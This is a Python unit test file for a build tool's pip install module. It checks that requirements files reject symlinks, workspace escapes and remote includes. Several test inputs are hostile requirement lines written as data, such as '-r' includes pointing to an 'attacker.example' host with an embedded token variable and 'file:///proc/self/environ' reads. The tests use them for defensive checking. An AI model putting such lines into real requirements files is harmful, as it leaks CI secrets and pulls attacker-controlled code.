"""Tests for the Python install module."""

# These tests share symlink setup patterns with other python modules.
# pylint: disable=duplicate-code,too-many-public-methods

import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from builddrone.drone_exception import DroneException
from builddrone.module.python.python_install_module import PythonInstallModule
from builddrone.runner import Runner


class TestPythonInstallModule(unittest.TestCase):
    """Verify install execution behavior."""

    def setUp(self):
        """Set up a mocked runner."""
        self.mock_runner = MagicMock(spec=Runner)
        self.mock_runner.logger = MagicMock()
        self.mock_runner.get_base_path.return_value = Path("blueprint")

    def test_run_installs_source(self):
        """Run pip install against the configured source."""
        self.mock_runner.run.return_value = 0

        module = PythonInstallModule()
        module.run(self.mock_runner, {"source": "build"})

        self.mock_runner.logger.info.assert_called_with("Installing...")
        self.mock_runner.run.assert_called_once_with(
            ["-m", "pip", "install", "--disable-pip-version-check", "build"],
            cwd=str(Path("blueprint")),
        )

    def test_run_without_source_raises(self):
        """Reject missing install source."""
        module = PythonInstallModule()

        with self.assertRaises(DroneException) as context:
            module.run(self.mock_runner, {})

        self.assertEqual(
            str(context.exception),
            "No source or requirements provided for install",
        )
        self.mock_runner.run.assert_not_called()

    def test_run_installs_requirements_file(self):
        """Pass a requirements file to pip as separate arguments."""
        self.mock_runner.run.return_value = 0

        module = PythonInstallModule()
        module.run(self.mock_runner, {"requirements": "requirements.txt"})

        self.mock_runner.run.assert_called_once_with(
            [
                "-m",
                "pip",
                "install",
                "--disable-pip-version-check",
                "-r",
                "requirements.txt",
            ],
            cwd=str(Path("blueprint")),
        )

    def test_run_with_nonzero_exit_code_raises(self):
        """Raise when pip install returns a non-zero exit code."""
        self.mock_runner.run.return_value = 1

        module = PythonInstallModule()

        with self.assertRaises(DroneException) as context:
            module.run(self.mock_runner, {"source": "build"})

        self.assertEqual(str(context.exception), "Install failed with exit code 1")

    def test_run_rejects_symlinked_requirements_file(self):
        """Reject a requirements file that is a symlink."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            secret = base_path / ".env"
            secret.write_text("PYPI_TOKEN=secret", encoding="utf-8")
            requirements = base_path / "requirements.txt"
            try:
                os.symlink(secret, requirements)
            except OSError:
                self.skipTest("Cannot create symlinks on this platform")

            module = PythonInstallModule()
            with self.assertRaises(DroneException) as context:
                module.run(self.mock_runner, {"requirements": "requirements.txt"})

        self.assertEqual(
            str(context.exception),
            f"Requirements file must not be a symlink: {requirements}",
        )
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_symlinked_requirements_file_when_symlinks_unavailable(self):
        """Reject a requirements file reported as a symlink."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            requirements = base_path / "requirements.txt"
            requirements.write_text("build\n", encoding="utf-8")
            original_is_symlink = Path.is_symlink

            def fake_is_symlink(path_self):
                if path_self == requirements:
                    return True
                return original_is_symlink(path_self)

            module = PythonInstallModule()
            with patch.object(Path, "is_symlink", fake_is_symlink):
                with self.assertRaises(DroneException) as context:
                    module.run(self.mock_runner, {"requirements": "requirements.txt"})

        self.assertEqual(
            str(context.exception),
            f"Requirements file must not be a symlink: {requirements}",
        )
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_intermediate_requirements_directory_symlink(self):
        """Reject a requirements path whose prefix is a directory symlink."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            host_dir = base_path / "host"
            host_dir.mkdir()
            (host_dir / "requirements.txt").write_text("build\n", encoding="utf-8")
            link_dir = base_path / "deps"
            try:
                os.symlink(host_dir, link_dir, target_is_directory=True)
            except OSError:
                self.skipTest("Cannot create directory symlinks on this platform")

            module = PythonInstallModule()
            with self.assertRaises(DroneException) as context:
                module.run(self.mock_runner, {"requirements": "deps/requirements.txt"})

        self.assertEqual(
            str(context.exception),
            f"Requirements file must not be a symlink: {link_dir}",
        )
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_symlinked_install_source(self):
        """Reject a local install source that is a symlink."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            secret = base_path / ".env"
            secret.write_text("PYPI_TOKEN=secret", encoding="utf-8")
            source = base_path / "package"
            try:
                os.symlink(secret, source)
            except OSError:
                self.skipTest("Cannot create symlinks on this platform")

            module = PythonInstallModule()
            with self.assertRaises(DroneException) as context:
                module.run(self.mock_runner, {"source": "package"})

        self.assertEqual(
            str(context.exception),
            f"Install source must not be a symlink: {source}",
        )
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_symlinked_install_source_when_symlinks_unavailable(self):
        """Reject a local install source reported as a symlink."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            source = base_path / "package"
            source.mkdir()
            original_is_symlink = Path.is_symlink

            def fake_is_symlink(path_self):
                if path_self == source:
                    return True
                return original_is_symlink(path_self)

            module = PythonInstallModule()
            with patch.object(Path, "is_symlink", fake_is_symlink):
                with self.assertRaises(DroneException) as context:
                    module.run(self.mock_runner, {"source": "package"})

        self.assertEqual(
            str(context.exception),
            f"Install source must not be a symlink: {source}",
        )
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_symlinked_requirements_include(self):
        """Reject local -r and -c files pip would open from a requirements file."""
        include_lines = (
            "-r secret.txt",
            "--requirement secret.txt",
            "--requirement=secret.txt",
            "-rsecret.txt",
            "-c secret.txt",
            "--constraint=secret.txt",
            "--hash=sha256:abc -r secret.txt",
            "-r \\\nsecret.txt",
        )
        for include_line in include_lines:
            with self.subTest(include_line=include_line):
                self.mock_runner.reset_mock()
                with tempfile.TemporaryDirectory() as temp_dir:
                    base_path = Path(temp_dir)
                    self.mock_runner.get_base_path.return_value = base_path
                    included = base_path / "secret.txt"
                    included.write_text("PYPI_TOKEN=secret\n", encoding="utf-8")
                    requirements = base_path / "requirements.txt"
                    requirements.write_text(f"{include_line}\n", encoding="utf-8")
                    original_is_symlink = Path.is_symlink

                    def fake_is_symlink(
                        path_self,
                        included=included,
                        original_is_symlink=original_is_symlink,
                    ):
                        if path_self == included:
                            return True
                        return original_is_symlink(path_self)

                    module = PythonInstallModule()
                    with patch.object(Path, "is_symlink", fake_is_symlink):
                        with self.assertRaises(DroneException) as context:
                            module.run(
                                self.mock_runner,
                                {"requirements": "requirements.txt"},
                            )

                self.assertEqual(
                    str(context.exception),
                    f"Requirements file must not be a symlink: {included}",
                )
                self.mock_runner.run.assert_not_called()

    def test_run_rejects_symlinked_requirements_include_when_symlinks_unavailable(self):
        """Reject an included requirements file reported as a symlink."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            included = base_path / "included.txt"
            included.write_text("PYPI_TOKEN=secret\n", encoding="utf-8")
            requirements = base_path / "requirements.txt"
            requirements.write_text("-r included.txt\n", encoding="utf-8")
            original_is_symlink = Path.is_symlink

            def fake_is_symlink(path_self):
                if path_self == included:
                    return True
                return original_is_symlink(path_self)

            module = PythonInstallModule()
            with patch.object(Path, "is_symlink", fake_is_symlink):
                with self.assertRaises(DroneException) as context:
                    module.run(self.mock_runner, {"requirements": "requirements.txt"})

        self.assertEqual(
            str(context.exception),
            f"Requirements file must not be a symlink: {included}",
        )
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_nested_symlinked_requirements_include(self):
        """Reject a symlink named by a nested include, relative to that file."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            reqs = base_path / "reqs"
            reqs.mkdir()
            included = reqs / "secret.txt"
            included.write_text("PYPI_TOKEN=secret\n", encoding="utf-8")
            (reqs / "base.txt").write_text("-r secret.txt\n", encoding="utf-8")
            (base_path / "requirements.txt").write_text(
                "-r reqs/base.txt\n", encoding="utf-8"
            )
            original_is_symlink = Path.is_symlink

            def fake_is_symlink(path_self):
                if path_self == included:
                    return True
                return original_is_symlink(path_self)

            module = PythonInstallModule()
            with patch.object(Path, "is_symlink", fake_is_symlink):
                with self.assertRaises(DroneException) as context:
                    module.run(self.mock_runner, {"requirements": "requirements.txt"})

        self.assertEqual(
            str(context.exception),
            f"Requirements file must not be a symlink: {included}",
        )
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_requirements_include_environment_variable(self):
        """Expand pip environment variables before checking include paths."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            included = base_path / "secret.txt"
            included.write_text("PYPI_TOKEN=secret\n", encoding="utf-8")
            (base_path / "requirements.txt").write_text(
                "-r ${REQ_INCLUDE}\n", encoding="utf-8"
            )
            original_is_symlink = Path.is_symlink

            def fake_is_symlink(path_self):
                if path_self == included:
                    return True
                return original_is_symlink(path_self)

            module = PythonInstallModule()
            with patch.dict(os.environ, {"REQ_INCLUDE": "secret.txt"}):
                with patch.object(Path, "is_symlink", fake_is_symlink):
                    with self.assertRaises(DroneException) as context:
                        module.run(
                            self.mock_runner, {"requirements": "requirements.txt"}
                        )

        self.assertEqual(
            str(context.exception),
            f"Requirements file must not be a symlink: {included}",
        )
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_file_url_requirements_include(self):
        """Reject a file URL include that points at a symlink."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            included = base_path / "secret.txt"
            included.write_text("PYPI_TOKEN=secret\n", encoding="utf-8")
            (base_path / "requirements.txt").write_text(
                "-r file:secret.txt\n", encoding="utf-8"
            )
            original_is_symlink = Path.is_symlink

            def fake_is_symlink(path_self):
                if path_self == included:
                    return True
                return original_is_symlink(path_self)

            module = PythonInstallModule()
            with patch.object(Path, "is_symlink", fake_is_symlink):
                with self.assertRaises(DroneException) as context:
                    module.run(self.mock_runner, {"requirements": "requirements.txt"})

        self.assertEqual(
            str(context.exception),
            f"Requirements file must not be a symlink: {included}",
        )
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_requirements_include_parent_through_symlink(self):
        """Reject an include whose symlink is hidden when '..' is normalized away."""
        include_lines = (
            "-r escape/../environ",
            "-r file:escape/../environ",
        )
        for include_line in include_lines:
            with self.subTest(include_line=include_line):
                self.mock_runner.reset_mock()
                with tempfile.TemporaryDirectory() as temp_dir:
                    base_path = Path(temp_dir)
                    self.mock_runner.get_base_path.return_value = base_path
                    escape = base_path / "escape"
                    escape.mkdir()
                    (base_path / "environ").write_text("build\n", encoding="utf-8")
                    (base_path / "requirements.txt").write_text(
                        f"{include_line}\n", encoding="utf-8"
                    )
                    original_is_symlink = Path.is_symlink

                    def fake_is_symlink(
                        path_self,
                        escape=escape,
                        original_is_symlink=original_is_symlink,
                    ):
                        if path_self == escape:
                            return True
                        return original_is_symlink(path_self)

                    module = PythonInstallModule()
                    with patch.object(Path, "is_symlink", fake_is_symlink):
                        with self.assertRaises(DroneException) as context:
                            module.run(
                                self.mock_runner,
                                {"requirements": "requirements.txt"},
                            )

                self.assertEqual(
                    str(context.exception),
                    f"Requirements file must not be a symlink: {escape}",
                )
                self.mock_runner.run.assert_not_called()

    def test_run_rejects_requirements_include_outside_workspace(self):
        """Reject an include that resolves outside the workspace."""
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            base_path = root / "project"
            base_path.mkdir()
            self.mock_runner.get_base_path.return_value = base_path
            secret = root / "secret.txt"
            secret.write_text("PYPI_TOKEN=secret\n", encoding="utf-8")
            (base_path / "requirements.txt").write_text(
                "-r ../secret.txt\n", encoding="utf-8"
            )

            module = PythonInstallModule()
            with self.assertRaises(DroneException) as context:
                module.run(self.mock_runner, {"requirements": "requirements.txt"})

        self.assertEqual(
            str(context.exception),
            "Requirements reference must exist inside the workspace: ../secret.txt",
        )
        self.assertNotIn("PYPI_TOKEN=secret", str(context.exception))
        self.mock_runner.run.assert_not_called()

    def test_run_installs_requirements_include_that_stays_inside_workspace(self):
        """Install when a '..' include still resolves inside the workspace."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            self.mock_runner.run.return_value = 0
            (base_path / "sub").mkdir()
            (base_path / "included.txt").write_text("build\n", encoding="utf-8")
            (base_path / "requirements.txt").write_text(
                "-r sub/../included.txt\n", encoding="utf-8"
            )

            module = PythonInstallModule()
            module.run(self.mock_runner, {"requirements": "requirements.txt"})

        self.mock_runner.run.assert_called_once()

    def test_run_installs_requirements_with_regular_include(self):
        """Install when nested requirement and constraint files are regular files."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            self.mock_runner.run.return_value = 0
            (base_path / "included.txt").write_text("build\n", encoding="utf-8")
            (base_path / "constraints.txt").write_text("build\n", encoding="utf-8")
            (base_path / "requirements.txt").write_text(
                "# -r secret.txt\n-r included.txt\n-c constraints.txt\n",
                encoding="utf-8",
            )

            module = PythonInstallModule()
            module.run(self.mock_runner, {"requirements": "requirements.txt"})

        self.mock_runner.run.assert_called_once_with(
            [
                "-m",
                "pip",
                "install",
                "--disable-pip-version-check",
                "-r",
                "requirements.txt",
            ],
            cwd=str(base_path),
        )

    def test_run_ignores_include_on_requirement_line(self):
        """Do not open -r paths that pip ignores on a package requirement line."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            self.mock_runner.run.return_value = 0
            included = base_path / "secret.txt"
            included.write_text("PYPI_TOKEN=secret\n", encoding="utf-8")
            (base_path / "requirements.txt").write_text(
                "build -r secret.txt\n", encoding="utf-8"
            )
            original_is_symlink = Path.is_symlink

            def fake_is_symlink(path_self):
                if path_self == included:
                    return True
                return original_is_symlink(path_self)

            module = PythonInstallModule()
            with patch.object(Path, "is_symlink", fake_is_symlink):
                module.run(self.mock_runner, {"requirements": "requirements.txt"})

        self.mock_runner.run.assert_called_once()

    def test_run_rejects_expanded_requirement_option(self):
        """Reject expanded -r, -c, --find-links, and -e values before pip runs."""
        secret = "pypi-live-token-xyz"
        appveyor = "v2.abc-appveyor-secret"
        lines = (
            "--find-links ${PYPI_TOKEN}",
            "--find-links=${PYPI_TOKEN}",
            "-f ${PYPI_TOKEN}",
            "-f${PYPI_TOKEN}",
            '--find-links "${PYPI_TOKEN}"',
            "--find-links \\\n${PYPI_TOKEN}",
            "-r ${APPVEYOR_API_TOKEN}",
            "--requirement ${APPVEYOR_API_TOKEN}",
            "--requirement=${APPVEYOR_API_TOKEN}",
            "-c ${APPVEYOR_API_TOKEN}",
            "--constraint=${APPVEYOR_API_TOKEN}",
            "-e ${APPVEYOR_API_TOKEN}",
            "--editable ${APPVEYOR_API_TOKEN}",
            "--editable=${APPVEYOR_API_TOKEN}",
        )
        env = {"PYPI_TOKEN": secret, "APPVEYOR_API_TOKEN": appveyor}
        for line in lines:
            with self.subTest(line=line):
                self.mock_runner.reset_mock()
                with tempfile.TemporaryDirectory() as temp_dir:
                    base_path = Path(temp_dir)
                    self.mock_runner.get_base_path.return_value = base_path
                    (base_path / "requirements.txt").write_text(
                        f"pylint==4.0.6\nbuild==1.5.0\n{line}\n",
                        encoding="utf-8",
                    )
                    if "PYPI_TOKEN" in line:
                        placeholder = "${PYPI_TOKEN}"
                    else:
                        placeholder = "${APPVEYOR_API_TOKEN}"
                    module = PythonInstallModule()
                    with patch.dict(os.environ, env):
                        with self.assertRaises(DroneException) as context:
                            module.run(
                                self.mock_runner,
                                {"requirements": "requirements.txt"},
                            )

                message = str(context.exception)
                self.assertEqual(
                    message,
                    "Requirements reference must exist inside the workspace: "
                    + placeholder,
                )
                self.assertNotIn(secret, message)
                self.assertNotIn(appveyor, message)
                self.mock_runner.run.assert_not_called()

    def test_run_rejects_requirements_reference_outside_workspace(self):
        """Reject remote URLs and paths that resolve outside the workspace."""
        self._assert_remote_references_rejected()
        leaked = "LEAKED_ENVIRONMENT=do-not-log"
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            base_path = root / "workspace"
            base_path.mkdir()
            self.mock_runner.get_base_path.return_value = base_path
            outside = root / "outside.txt"
            outside.write_text(f"{leaked}\nbuild==1.5.0\n", encoding="utf-8")
            (root / "links").mkdir()
            nested = base_path / "nested.txt"
            requirements = base_path / "requirements.txt"
            module = PythonInstallModule()
            escaped = (
                "-r ../outside.txt",
                f"-r {outside.as_uri()}",
                "--find-links ../links",
                "-e ../links",
            )
            for line in escaped:
                with self.subTest(line=line):
                    self._assert_outside_reference_rejected(requirements, line, leaked)

            self.mock_runner.reset_mock()
            nested.write_text(f"-r {outside.as_uri()}\n", encoding="utf-8")
            requirements.write_text("-r nested.txt\n", encoding="utf-8")
            with self.assertRaises(DroneException) as context:
                module.run(self.mock_runner, {"requirements": "requirements.txt"})
            self.assertNotIn(leaked, str(context.exception))
            self.mock_runner.run.assert_not_called()

            self.mock_runner.reset_mock()
            nested.write_text(
                "-r https://attacker.example/evil.txt\n",
                encoding="utf-8",
            )
            requirements.write_text("-r nested.txt\n", encoding="utf-8")
            with patch("urllib.request.urlopen") as urlopen:
                with self.assertRaises(DroneException):
                    module.run(self.mock_runner, {"requirements": "requirements.txt"})
            urlopen.assert_not_called()
            self.mock_runner.run.assert_not_called()

    def _assert_remote_references_rejected(self):
        """Reject remote -r, -c, --find-links, and -e URLs before pip fetches them."""
        secret = "pypi-live-token-xyz"
        cases = (
            "-r https://attacker.example/evil.txt",
            "-c https://attacker.example/constraints.txt",
            "--requirement=http://attacker.example/evil.txt",
            "-r https://attacker.example/${PYPI_TOKEN}/req.txt",
            "-e git+https://github.com/example/pkg.git#egg=pkg",
            "--find-links https://files.example/simple",
        )
        for line in cases:
            with self.subTest(line=line):
                self.mock_runner.reset_mock()
                with tempfile.TemporaryDirectory() as temp_dir:
                    base_path = Path(temp_dir)
                    self.mock_runner.get_base_path.return_value = base_path
                    (base_path / "requirements.txt").write_text(
                        f"build==1.5.0\n{line}\n",
                        encoding="utf-8",
                    )
                    module = PythonInstallModule()
                    with patch.dict(os.environ, {"PYPI_TOKEN": secret}):
                        with patch("urllib.request.urlopen") as urlopen:
                            with self.assertRaises(DroneException) as context:
                                module.run(
                                    self.mock_runner,
                                    {"requirements": "requirements.txt"},
                                )

                self.assertNotIn(secret, str(context.exception))
                urlopen.assert_not_called()
                self.mock_runner.run.assert_not_called()

    def _assert_outside_reference_rejected(self, requirements, line, leaked):
        """Fail when *line* escapes the workspace, without logging *leaked*."""
        self.mock_runner.reset_mock()
        requirements.write_text(f"build==1.5.0\n{line}\n", encoding="utf-8")
        module = PythonInstallModule()
        with patch("urllib.request.urlopen") as urlopen:
            with self.assertRaises(DroneException) as context:
                module.run(self.mock_runner, {"requirements": "requirements.txt"})
        self.assertNotIn(leaked, str(context.exception))
        urlopen.assert_not_called()
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_remote_include_before_nested_environ_url(self):
        """Reject a remote -r/-c before pip opens a nested file:// environment URL.

        Pip downloads an http requirements file and then opens nested file URLs
        from that body. ``file:///proc/self/environ`` is a symlink, so a direct
        include is rejected, but the nested URL is only present after the
        download. Refusing the remote include keeps the process environment out
        of the build log.
        """
        secret = "pypi-live-token-xyz"
        appveyor = "v2.abc-appveyor-secret"
        lines = (
            "-r https://attacker.example/evil.txt",
            "-c https://attacker.example/evil.txt",
            "--requirement=http://attacker.example/evil.txt",
            "-r \\\nhttps://attacker.example/evil.txt",
            "-r https://attacker.example/${PYPI_TOKEN}/evil.txt",
            "-r file://attacker.example/proc/self/environ",
            "-r file://localhost/proc/self/environ",
        )
        env = {"PYPI_TOKEN": secret, "APPVEYOR_API_TOKEN": appveyor}
        for line in lines:
            with self.subTest(line=line):
                self.mock_runner.reset_mock()
                with tempfile.TemporaryDirectory() as temp_dir:
                    base_path = Path(temp_dir)
                    self.mock_runner.get_base_path.return_value = base_path
                    (base_path / "requirements.txt").write_text(
                        f"build==1.5.0\n{line}\n",
                        encoding="utf-8",
                    )
                    module = PythonInstallModule()
                    with patch.dict(os.environ, env):
                        with patch("urllib.request.urlopen") as urlopen:
                            urlopen.return_value.read.return_value = (
                                b"-r file:///proc/self/environ\n"
                            )
                            with self.assertRaises(DroneException) as context:
                                module.run(
                                    self.mock_runner,
                                    {"requirements": "requirements.txt"},
                                )

                message = str(context.exception)
                self.assertNotIn(secret, message)
                self.assertNotIn(appveyor, message)
                self.assertNotIn("file:///proc/self/environ", message)
                self.assertNotIn("PYPI_TOKEN=", message)
                urlopen.assert_not_called()
                self.mock_runner.run.assert_not_called()

    def test_run_rejects_nested_remote_include_in_local_file(self):
        """Reject a remote include named by a local requirements file."""
        secret = "pypi-live-token-xyz"
        appveyor = "v2.abc-appveyor-secret"
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            (base_path / "nested.txt").write_text(
                "-r https://attacker.example/evil.txt\n",
                encoding="utf-8",
            )
            (base_path / "requirements.txt").write_text(
                "-r nested.txt\n",
                encoding="utf-8",
            )
            module = PythonInstallModule()
            env = {"PYPI_TOKEN": secret, "APPVEYOR_API_TOKEN": appveyor}
            with patch.dict(os.environ, env):
                with patch("urllib.request.urlopen") as urlopen:
                    urlopen.return_value.read.return_value = (
                        b"-r file:///proc/self/environ\n"
                    )
                    with self.assertRaises(DroneException) as context:
                        module.run(
                            self.mock_runner, {"requirements": "requirements.txt"}
                        )

        message = str(context.exception)
        self.assertNotIn(secret, message)
        self.assertNotIn(appveyor, message)
        self.assertNotIn("file:///proc/self/environ", message)
        urlopen.assert_not_called()
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_direct_environ_file_url(self):
        """Reject file:///proc/self/environ before pip reads the environment."""
        secret = "pypi-live-token-xyz"
        appveyor = "v2.abc-appveyor-secret"
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            (base_path / "requirements.txt").write_text(
                "-r file:///proc/self/environ\n",
                encoding="utf-8",
            )
            module = PythonInstallModule()
            env = {"PYPI_TOKEN": secret, "APPVEYOR_API_TOKEN": appveyor}
            with patch.dict(os.environ, env):
                with self.assertRaises(DroneException) as context:
                    module.run(self.mock_runner, {"requirements": "requirements.txt"})

        message = str(context.exception)
        self.assertNotIn(secret, message)
        self.assertNotIn(appveyor, message)
        self.assertNotIn("PYPI_TOKEN=", message)
        self.mock_runner.run.assert_not_called()

    def test_run_rejects_remote_requirements_argument(self):
        """Reject a requirements argument that is itself a remote or file URL."""
        secret = "pypi-live-token-xyz"
        arguments = (
            "https://attacker.example/evil.txt",
            "http://attacker.example/${PYPI_TOKEN}/evil.txt",
            "file:///proc/self/environ",
        )
        for requirements in arguments:
            with self.subTest(requirements=requirements):
                self.mock_runner.reset_mock()
                with tempfile.TemporaryDirectory() as temp_dir:
                    base_path = Path(temp_dir)
                    self.mock_runner.get_base_path.return_value = base_path
                    module = PythonInstallModule()
                    with patch.dict(os.environ, {"PYPI_TOKEN": secret}):
                        with patch("urllib.request.urlopen") as urlopen:
                            with self.assertRaises(DroneException) as context:
                                module.run(
                                    self.mock_runner,
                                    {"requirements": requirements},
                                )

                message = str(context.exception)
                self.assertNotIn(secret, message)
                self.assertNotIn("PYPI_TOKEN=", message)
                urlopen.assert_not_called()
                self.mock_runner.run.assert_not_called()

    def test_run_installs_local_find_links_and_editable(self):
        """Install when find-links and editable paths stay inside the workspace."""
        with tempfile.TemporaryDirectory() as temp_dir:
            base_path = Path(temp_dir)
            self.mock_runner.get_base_path.return_value = base_path
            self.mock_runner.run.return_value = 0
            wheelhouse = base_path / "wheelhouse"
            wheelhouse.mkdir()
            package = base_path / "pkg"
            package.mkdir()
            (base_path / "included.txt").write_text("build==1.5.0\n", encoding="utf-8")
            requirements = (
                "build==1.5.0\n",
                "build==1.5.0\n--find-links wheelhouse\n",
                "-e pkg\n",
                "-e .[dev]\n",
                "-r ${REQ_INCLUDE}\n",
                "--find-links ${LINKS}\nbuild==1.5.0\n",
            )
            env = {"REQ_INCLUDE": "included.txt", "LINKS": "wheelhouse"}
            for body in requirements:
                with self.subTest(body=body):
                    self.mock_runner.reset_mock()
                    self.mock_runner.run.return_value = 0
                    (base_path / "requirements.txt").write_text(body, encoding="utf-8")
                    module = PythonInstallModule()
                    with patch.dict(os.environ, env):
                        module.run(
                            self.mock_runner, {"requirements": "requirements.txt"}
                        )
                    self.mock_runner.run.assert_called_once()
